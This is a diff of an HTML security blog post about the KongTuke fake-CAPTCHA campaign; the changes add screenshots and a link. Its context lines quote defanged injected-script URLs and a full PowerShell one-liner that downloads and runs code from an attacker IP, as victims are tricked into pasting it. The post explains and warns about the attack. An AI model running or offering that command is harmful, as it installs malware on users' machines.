@@ -43,6 +43,8 @@
                 <h2>How the KongTuke Attack Works</h2>
                 <p>The attack begins subtly—through injected malicious scripts found on seemingly trustworthy websites. One example highlighted in the <a href="https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2025-04-04-IOCs-forKongTuke-web-inject-leading-to-fake-CAPTHA-page.txt">report</a> is: <span class="special-text">hxxps://lancasternh[.]com/6t7y.js</span> This script then loads a second-stage payload from: <span class="special-text">hxxps://lancasternh[.]com/js.php</span> <br>
                 Once a user visits the site, the malicious code collects device data, such as IP address, browser details, and referrer info—<strong>all encoded in Base64</strong> to conceal its behavior.</p>
+                <center><img src="../images/fakecaptchs-injectedscript.png" alt="injected script">
+                <img src="../images/fakecaptchs-wiresharkanalysis.png" alt="wiresark analysis"></center>
                 <h3>The Fake CAPTCHA Trap</h3>
                 <p>The user is then redirected to a <strong>fake CAPTCHA page</strong>—designed to resemble legitimate verification systems. But unlike real CAPTCHAs that ask you to select images or check a box, this one prompts suspicious behavior like:
                     <ul style="margin-left: 30px;">
@@ -59,6 +61,7 @@
                 The malware then <strong>urges the user to open a Run window (Win + R)</strong> and paste the clipboard content—unknowingly executing harmful code.
                 Here’s an example of the PowerShell payload used: <span class="special-text">powershell -w h -c "iex $(irm 138.199.156[.]22:8080/$($z = [datetime]::UtcNow; $y = ([datetime]('01/01/' + '1970')); $x = ($z - $y).TotalSeconds; $w = [math]::Floor($x); $v = $w - ($w % 16); [int64]$v))"</span>. This command connects to: <span class="special-text">138.199.156[.]22:8080</span>
                 From there, it retrieves additional malicious payloads tailored to the current timestamp.</p>
+                <center><img src="../images/fakeCAPTCHs.png" alt="fake CAPTCHAs"></center>
             </div>
 
             <div class="content">
@@ -74,6 +77,7 @@
                         <li>Displays signs of <b>AsyncRAT</b>, a powerful remote access trojan used in past cyberespionage campaigns.</li>
                     </ul>
                 Yet, the <strong>final malware payload remains unknown</strong>, making the threat more dangerous because its endgame is still concealed.</p>
+                <center><img src="../images/fakecaptchs-c2.png" alt="C2 server"></center>
             </div>
 
             <div class="content">
@@ -103,6 +107,10 @@
                 <p>The KongTuke cyberattack is a clear reminder of how advanced threat actors are exploiting human behavior and trust in web design. By using <strong>fake CAPTCHAs</strong>, <strong>clipboard hijacking</strong>, and malicious scripting, attackers manipulate users into becoming their own attack vectors. <br>
                 As researchers like Bradley Duncan and platforms like <strong>Unit 42</strong> continue to analyze this campaign, staying informed is <strong>your first line of defense</strong>. <br>
                 🔒 <i>When in doubt, don’t click. Don’t paste. Stay secure.</i></p>
+            </div>
+
+            <div class="content">
+                <p><a href="../blogs/blogs.html"><b>READ MORE BLOGS</b></a></p>
             </div>
         </main>
 
